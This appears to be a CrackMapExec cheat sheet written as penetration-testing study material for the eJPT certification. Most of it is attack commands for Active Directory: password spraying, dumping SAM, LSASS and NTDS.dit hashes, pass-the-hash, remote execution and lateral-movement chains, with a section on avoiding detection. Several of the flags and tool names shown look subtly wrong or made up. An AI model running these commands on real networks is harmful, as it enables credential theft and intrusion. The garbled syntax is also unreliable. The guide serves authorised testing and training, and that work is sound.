# 🔓 CrackMapExec (CME) - Complete Cheat Sheet

> **Master Active Directory and Windows Network Exploitation with CrackMapExec**

---

## Table of Contents

1. [What is CrackMapExec?](#what-is-crackmapexec)
2. [Installation & Setup](#installation--setup)
3. [Basic Concepts](#basic-concepts)
4. [SMB Module (Most Used)](#smb-module)
5. [LDAP Enumeration](#ldap-enumeration)
6. [Credential Gathering](#credential-gathering)
7. [Lateral Movement](#lateral-movement)
8. [Post-Exploitation](#post-exploitation)
9. [Real-World Scenarios](#real-world-scenarios)
10. [Tips & Tricks](#tips--tricks)
11. [Troubleshooting](#troubleshooting)

---

## What is CrackMapExec?

CrackMapExec (CME) is a post-exploitation framework that automates assessing the security of large Active Directory networks.

**Key Capabilities:**
- ✅ Enumerate Windows networks
- ✅ Test credential validity across systems
- ✅ Dump hashes and secrets
- ✅ Execute commands remotely
- ✅ Dump LSASS memory
- ✅ Spray credentials safely
- ✅ Identify lateral movement paths
- ✅ Chain exploits automatically

**When to Use:**
- After gaining initial credentials
- During post-exploitation phase
- For lateral movement in Windows networks
- When testing Active Directory security

---

## Installation & Setup

### Prerequisites

```bash
# Required
- Python 3.7+
- pip package manager
- Git
- libssl-dev (Linux)

# Check Python version
python3 --version
# Output should be 3.7+
```

### Installation on Kali Linux

```bash
# CrackMapExec comes pre-installed on Kali
crackmapexec --version

# If not installed, update:
sudo apt-get update
sudo apt-get install crackmapexec

# Verify installation
crackmapexec -h
```

### Installation on Other Linux

```bash
# Clone repository
git clone https://github.com/Porchetta-Industries/CrackMapExec.git
cd CrackMapExec

# Install dependencies
pip3 install -r requirements.txt

# Install CME
python3 setup.py install

# Or use pip
pip3 install crackmapexec

# Verify
crackmapexec --version
```

### Installation on Windows

```powershell
# Using pip
pip install crackmapexec

# Or download from GitHub
git clone https://github.com/Porchetta-Industries/CrackMapExec.git
cd CrackMapExec
pip install -r requirements.txt
python setup.py install
```

### Update CrackMapExec

```bash
# Update to latest version
sudo pip3 install --upgrade crackmapexec

# Check version
crackmapexec --version
```

---

## Basic Concepts

### CrackMapExec Syntax

```bash
# General syntax
crackmapexec <protocol> <target> [options]

# Protocols available
smb      - Windows SMB protocol (most common)
ldap     - LDAP directory service
mssql    - SQL Server databases
winrm    - Windows Remote Management
ssh      - SSH protocol
```

### Common Options

```bash
# Credentials
-u USERNAME           # Username to test
-p PASSWORD           # Password to test
-d DOMAIN             # Domain name
-H HASH               # NTLM hash instead of password

# Target specifications
-X COMMAND            # Execute command on remote
--local-auth          # Use local authentication
--continue-on-error   # Don't stop on first error

# Output
-v, --verbose         # Verbose output
--output-file FILE    # Save results to file

# Execution
--exec-method METHOD  # wmiexec, smbexec, mmcexec, etc.
-x COMMAND            # Execute command (SMB)
-X COMMAND            # Execute PowerShell command
```

---

## SMB Module (Most Used)

SMB (Server Message Block) is the protocol Windows uses for file sharing and communication.

### Check Service Availability

```bash
# Test if SMB is accessible
crackmapexec smb 192.168.1.100

# Test multiple targets
crackmapexec smb 192.168.1.0/24

# Test range
crackmapexec smb 192.168.1.100-110
```

### Check NULL Sessions (No Credentials)

```bash
# Check if NULL session allowed
crackmapexec smb 192.168.1.100 -u "" -p ""

# If [+] appears = vulnerable to NULL session
# Can enumerate shares, users, groups without credentials
```

### Test Credentials

```bash
# Test single credential
crackmapexec smb 192.168.1.100 -u admin -p password123

# Test multiple credentials
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# Test with domain
crackmapexec smb 192.168.1.100 -u DOMAIN\\admin -p password123
# Or
crackmapexec smb 192.168.1.100 -u admin -p password123 -d DOMAIN

# Test with hash (Pass-the-Hash)
crackmapexec smb 192.168.1.100 -u admin -H LMHASH:NTHASH

# Test multiple users from file
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt

# Test multiple passwords for one user
crackmapexec smb 192.168.1.100 -u admin -p passwords.txt
```

### Enumerate Shares

```bash
# List available shares
crackmapexec smb 192.168.1.100 -u admin -p password123 --shares

# Output:
# Share            Permissions     Remark
# ADMIN$           READ,WRITE      Remote Admin
# C$               READ,WRITE      Default share
# IPC$             READ            IPC
# Documents        READ            File share
```

### Enumerate Users

```bash
# List users on system
crackmapexec smb 192.168.1.100 -u admin -p password123 --users

# Output shows all local and domain users
```

### Enumerate Groups

```bash
# List groups
crackmapexec smb 192.168.1.100 -u admin -p password123 --groups

# List group members
crackmapexec smb 192.168.1.100 -u admin -p password123 --groups -v
```

### Enumerate Disks

```bash
# List available drives
crackmapexec smb 192.168.1.100 -u admin -p password123 --disks

# Output:
# Disk              Free Space      Size
# C:\              50 GB            200 GB
# D:\              100 GB           500 GB
```

---

## LDAP Enumeration

LDAP (Lightweight Directory Access Protocol) is Active Directory's query protocol.

### Check LDAP Access

```bash
# Test LDAP connectivity
crackmapexec ldap 192.168.1.100 -u admin -p password123

# If [+] = accessible
```

### Enumerate AD Users

```bash
# Get all domain users
crackmapexec ldap 192.168.1.100 -u admin -p password123 --users

# Get detailed info
crackmapexec ldap 192.168.1.100 -u admin -p password123 --users -v
```

### Enumerate AD Groups

```bash
# Get all domain groups
crackmapexec ldap 192.168.1.100 -u admin -p password123 --groups

# Get group members
crackmapexec ldap 192.168.1.100 -u admin -p password123 --groups -v
```

### Get Password Policy

```bash
# Get domain password policy
crackmapexec ldap 192.168.1.100 -u admin -p password123 --password-pol

# Shows:
# - Minimum password length
# - Password complexity
# - Lockout duration
# - Lockout threshold
```

### Query Domain Info

```bash
# Get domain information
crackmapexec ldap 192.168.1.100 -u admin -p password123 --dc-list

# Shows domain controllers
```

---

## Credential Gathering

### Dump SAM Hashes (Local)

```bash
# Extract local account hashes
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:HASH::::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:HASH::::
```

### Dump LSASS (Domain Credentials)

```bash
# Extract LSASS memory (must be admin)
crackmapexec smb 192.168.1.100 -u admin -p password123 --lsass

# Output shows:
# - Domain user credentials
# - Cached credentials
# - Service accounts
# - Plain-text passwords (if not protected)
```

### Dump LSA Secrets

```bash
# Extract secrets from LSA
crackmapexec smb 192.168.1.100 -u admin -p password123 --lsa

# Reveals:
# - Auto-logon credentials
# - Cached domain credentials
# - Service account passwords
```

### Dump NTDS.dit (Full AD Database)

```bash
# Extract entire Active Directory
crackmapexec smb 192.168.1.100 -u admin -p password123 --ntds

# WARNING: This is the nuclear option
# Extracts ALL domain user hashes
# Requires Domain Admin or specific permissions
# Takes time on large domains

# Faster method (VSS)
crackmapexec smb 192.168.1.100 -u admin -p password123 --ntds vss

# More stealthy
crackmapexec smb 192.168.1.100 -u admin -p password123 --ntds drsuapi
```

---

## Lateral Movement

### Execute Commands (Basic)

```bash
# Execute single command
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "whoami"

# Execute PowerShell command
crackmapexec smb 192.168.1.100 -u admin -p password123 -X "Get-Process"

# Execute multi-line commands
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "cmd /c hostname && whoami"
```

### Execute Methods

```bash
# Use specific execution method
--exec-method wmiexec    # WMI (slower but quiet)
--exec-method smbexec    # SMB (faster but louder)
--exec-method mmcexec    # MMC (new method)
--exec-method atexec     # Task Scheduler (stealthy)
--exec-method impacket   # Impacket-based execution

# Example
crackmapexec smb 192.168.1.100 -u admin -p password123 \
  --exec-method wmiexec -x "whoami"
```

### Interactive Shell Access

```bash
# Get interactive shell
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "cmd"

# Note: Limited interactivity
# For full shell, use other tools:
# - psexec
# - smbexec
# - wmiexec (standalone)

# Example with wmiexec (part of impacket)
wmiexec.py DOMAIN/admin:password123@192.168.1.100
```

### Pass-the-Hash Attacks

```bash
# Use NTLM hash instead of password
crackmapexec smb 192.168.1.100 -u admin -H "LMHASH:NTHASH" -x "whoami"

# Format: LMHASH:NTHASH (separated by colon)
# Example:
# aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Pass-the-Hash for lateral movement
crackmapexec smb 192.168.1.0/24 -u admin -H "hash" -x "whoami"
# Tests all systems with same hash
```

### Credential Spraying (Safely)

```bash
# Test same password on multiple users
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Winter2024!" --continue-on-error

# Test same credentials across subnet
crackmapexec smb 192.168.1.0/24 -u admin -p password123 --continue-on-error

# Avoid lockouts
# Use --continue-on-error to avoid stopping on failures
# Consider account lockout policies
```

---

## Post-Exploitation

### Dump Credentials from Memory

```bash
# Dump all credentials from system
crackmapexec smb 192.168.1.100 -u admin -p password123 --dumped-lsa

# Combines:
# - SAM hashes
# - LSASS cached credentials
# - LSA secrets
# - NTDS.dit (if available)
```

### Find Admin Shares

```bash
# Identify admin shares and who can access
crackmapexec smb 192.168.1.100 -u admin -p password123 --shares --verbose

# Look for unusual shares:
# - Backup shares
# - Shared folders with sensitive data
# - SQL Server named pipes
```

### Check for Logged-in Users

```bash
# See who's currently logged in
crackmapexec smb 192.168.1.100 -u admin -p password123 --users -v

# High-value targets:
# - Domain admins
# - IT staff
# - Service accounts
```

### Identify Domain Admins

```bash
# Get list of domain administrators
crackmapexec ldap 192.168.1.100 -u admin -p password123 --groups -v

# Look for:
# - Domain Admins group
# - Enterprise Admins
# - Schema Admins
```

---

## Real-World Scenarios

### Scenario 1: Network Reconnaissance

```bash
# Step 1: Identify SMB hosts
nmap -p 445 192.168.1.0/24 | grep open

# Step 2: Check each for vulnerabilities
crackmapexec smb 192.168.1.0/24

# Step 3: Try NULL session
crackmapexec smb 192.168.1.0/24 -u "" -p "" --shares

# Step 4: Enumerate users (if accessible)
crackmapexec smb 192.168.1.0/24 -u "" -p "" --users
```

### Scenario 2: Credential Testing After Breach

```bash
# Step 1: You obtained: admin / password123

# Step 2: Test on single system
crackmapexec smb 192.168.1.100 -u admin -p password123

# Step 3: If valid, dump hashes
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam

# Step 4: Test credentials across subnet
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# Step 5: Find other admin accounts
crackmapexec smb 192.168.1.100 -u admin -p password123 --users
```

### Scenario 3: Lateral Movement Chain

```bash
# Step 1: Start with user credentials
# User: john / MyPass123

# Step 2: Enumerate systems he can access
crackmapexec smb 192.168.1.0/24 -u john -p MyPass123

# Step 3: Find admin shares
crackmapexec smb 192.168.1.100 -u john -p MyPass123 --shares

# Step 4: Dump hashes on accessible system
crackmapexec smb 192.168.1.105 -u john -p MyPass123 --sam

# Step 5: Use dumped hash on other systems (Pass-the-Hash)
crackmapexec smb 192.168.1.0/24 -u admin -H "dumped_hash"

# Step 6: Eventually access Domain Admin
# → Escalate privileges
# → Access all systems
```

### Scenario 4: Finding High-Value Targets

```bash
# Step 1: Get valid credentials
# admin / password123

# Step 2: Identify domain controllers
crackmapexec ldap 192.168.1.100 -u admin -p password123 --dc-list

# Step 3: Identify domain admins
crackmapexec ldap 192.168.1.100 -u admin -p password123 --groups -v | grep "Domain Admins"

# Step 4: Find where they're logged in
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# Step 5: Target those systems for credential harvesting
```

---

## Tips & Tricks

### Speed Optimization

```bash
# Use threading for faster scanning
crackmapexec smb 192.168.1.0/24 -u admin -p password123 -t 100

# Default: 100 threads (usually good)
# Can increase to 500 for large networks
# Balance: speed vs. system load

# Limit targets for testing
crackmapexec smb 192.168.1.100 -u admin -p password123 -t 10
```

### Output to File

```bash
# Save results to file
crackmapexec smb 192.168.1.0/24 -u admin -p password123 > results.txt

# Save with timestamp
crackmapexec smb 192.168.1.0/24 -u admin -p password123 > results_$(date +%s).txt

# Verbose output to file
crackmapexec smb 192.168.1.0/24 -u admin -p password123 -v > results_verbose.txt
```

### Color Output Control

```bash
# Colored output (default)
crackmapexec smb 192.168.1.100 -u admin -p password123

# Disable colors (for piping/files)
crackmapexec smb 192.168.1.100 -u admin -p password123 --no-color
```

### Avoid Detection

```bash
# Slower execution (less network noise)
crackmapexec smb 192.168.1.0/24 -u admin -p password123 -t 1

# Use less verbose methods
--exec-method wmiexec    # Quieter than smbexec

# Avoid common patterns
# Don't test all users with same password on all systems
# Spread out tests over time

# Obfuscate activity
# Mix in legitimate-looking commands
# Use native tools (already in Windows)
```

### Custom Modules

```bash
# List available modules
crackmapexec smb 192.168.1.100 -L

# Use specific module
crackmapexec smb 192.168.1.100 -u admin -p password123 -M module_name

# Common modules:
# - mimikatz: Dump credentials
# - empire: Deploy Empire agent
# - uac_bypass: Bypass User Account Control
# - web_deliver: Host payload
```

---

## Troubleshooting

### Common Issues

| Error | Cause | Solution |
|-------|-------|----------|
| "Connection refused" | SMB not listening | Check firewall, port 445 |
| "Authentication failed" | Wrong credentials | Verify username/password/domain |
| "Access denied" | Insufficient permissions | Need higher privilege user |
| "Timeout" | Network issue | Check connectivity, firewall |
| "Permission denied (NTLM)" | NTLM signing enforced | Requires correct domain setup |

### Debug Commands

```bash
# Test SMB connectivity
crackmapexec smb 192.168.1.100 --no-color -v

# Check if port is open
nc -zv 192.168.1.100 445

# Verify credentials manually
smbclient -U admin%password123 //192.168.1.100/C$

# Test with Impacket
impacket-smb3 192.168.1.100
```

### Permission Issues

```bash
# If getting "Access Denied":
# 1. Verify user is Domain Admin
# 2. Check if UAC is enabled
# 3. Confirm account not locked out
# 4. Verify NTLM not disabled

# Test with local admin
crackmapexec smb 192.168.1.100 -u localadmin -p password123 --local-auth

# Test without domain
crackmapexec smb 192.168.1.100 -u admin -p password123 -d .
```

---

## Quick Reference Commands

### Most Used

```bash
# Test credentials on single system
crackmapexec smb 192.168.1.100 -u admin -p password123

# Test across subnet
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# Dump SAM hashes
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam

# List shares
crackmapexec smb 192.168.1.100 -u admin -p password123 --shares

# Enumerate users
crackmapexec smb 192.168.1.100 -u admin -p password123 --users

# Execute command
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "whoami"

# Pass-the-Hash
crackmapexec smb 192.168.1.100 -u admin -H "hash" -x "whoami"

# LDAP enumeration
crackmapexec ldap 192.168.1.100 -u admin -p password123 --users

# List modules
crackmapexec smb 192.168.1.100 -L

# Using module
crackmapexec smb 192.168.1.100 -u admin -p password123 -M mimikatz
```

---

## eJPT Context

### Where CrackMapExec Fits

**eJPT Certification Path:**
```
Phase 1: Reconnaissance (Nmap)
Phase 2: Scanning/Enumeration (Nmap, SMB)
Phase 3: Vulnerability Assessment
Phase 4: Exploitation (Get initial access)
→ Phase 5: POST-EXPLOITATION ← CrackMapExec shines here
Phase 6: Lateral Movement (CME used heavily)
Phase 7: Privilege Escalation
Phase 8: Maintaining Access
Phase 9: Covering Tracks
```

### eJPT-Level Usage

```bash
# After compromising one system:
# 1. Dump hashes
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam

# 2. Crack hashes (offline with hashcat)
hashcat -m 1000 hashes.txt /path/to/wordlist.txt

# 3. Use new credentials on other systems
crackmapexec smb 192.168.1.0/24 -u newuser -p cracked_password

# 4. Find admin account
crackmapexec smb 192.168.1.105 -u newuser -p password -x "net localgroup administrators"

# 5. Report findings
# - Systems accessed
# - Credentials found
# - Potential escalation paths
```

### Exam Scenario

```bash
# During eJPT exam:

# Step 1: You gained initial foothold (RDP, shell, etc.)

# Step 2: Run CME for network reconnaissance
crackmapexec smb 192.168.1.0/24

# Step 3: Try credentials you found
crackmapexec smb 192.168.1.0/24 -u founduser -p foundpass

# Step 4: Dump credentials
crackmapexec smb 192.168.1.100 -u founduser -p foundpass --sam

# Step 5: Test credentials laterally
crackmapexec smb 192.168.1.0/24 -u admin -p admin123

# Step 6: Document findings in report
# "Dumped 10 user hashes"
# "Tested across 20 systems"
# "Found valid credentials for 5 additional systems"
# "Identified path to domain admin"
```

---

## Common Commands for Study

### Basic Enumeration

```bash
crackmapexec smb 192.168.1.100 -u admin -p password123 --shares
crackmapexec smb 192.168.1.100 -u admin -p password123 --users
crackmapexec smb 192.168.1.100 -u admin -p password123 --groups
crackmapexec smb 192.168.1.100 -u admin -p password123 --disks
```

### Credential Dumping

```bash
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam
crackmapexec smb 192.168.1.100 -u admin -p password123 --lsass
crackmapexec smb 192.168.1.100 -u admin -p password123 --lsa
```

### Command Execution

```bash
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "whoami"
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "hostname"
crackmapexec smb 192.168.1.100 -u admin -p password123 -x "net user"
```

### LDAP Queries

```bash
crackmapexec ldap 192.168.1.100 -u admin -p password123 --users
crackmapexec ldap 192.168.1.100 -u admin -p password123 --groups
crackmapexec ldap 192.168.1.100 -u admin -p password123 --password-pol
```

---

## Security Notes

### Legal Usage

⚠️ **CrackMapExec is powerful and dangerous**

- Only use on systems you own or have permission to test
- Unauthorized access is illegal
- Document authorization for all tests
- Follow responsible disclosure practices

### Defensive Awareness

As a blue teamer, know that:
- CME is commonly used for lateral movement
- Monitor for SMB activity to same user across systems
- Watch for credential dumping attempts
- Alert on unusual PowerShell execution
- Monitor for multiple failed authentication attempts
- Track LSASS access and suspicious process injection

---

## Conclusion

CrackMapExec is an essential tool for:
- Active Directory security testing
- Post-exploitation enumeration
- Lateral movement automation
- Credential harvesting
- Network reconnaissance in Windows environments

Master CME and you'll significantly improve your penetration testing efficiency!

---

<div align="center">

### Master CrackMapExec. Master Active Directory. 🔓

**Happy hacking! 💪**

</div>

---

**Last Updated:** June 2026  
**Status:** Production Ready  
**Format:** eJPT Level Professional Documentation  
**Difficulty:** Intermediate to Advanced

---

© 2026 | CrackMapExec Cheat Sheet | Educational Purpose
